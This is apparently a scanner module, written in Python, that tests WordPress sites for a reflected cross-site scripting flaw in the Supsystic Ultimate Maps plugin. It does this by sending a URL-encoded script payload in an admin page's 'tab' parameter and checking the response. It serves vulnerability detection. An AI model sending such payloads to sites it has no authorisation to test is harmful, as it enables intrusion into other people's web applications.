#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Supsystic Ultimate Maps plugin before 1."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Supsystic Ultimate Maps <1.2.5 - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'wpscan', 'packetstorm', 'wordpress', 'wp-plugin', 'maps', 'supsystic', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        ...
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('/wp-content/plugins/ultimate-maps-by-supsystic/modules/maps/css/',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-admin/admin.php?page=ultimate-maps-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ...
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Supsystic Ultimate Maps <1.2.5 - Cross-Site Scripting detected', path=path)
            return True
        return False
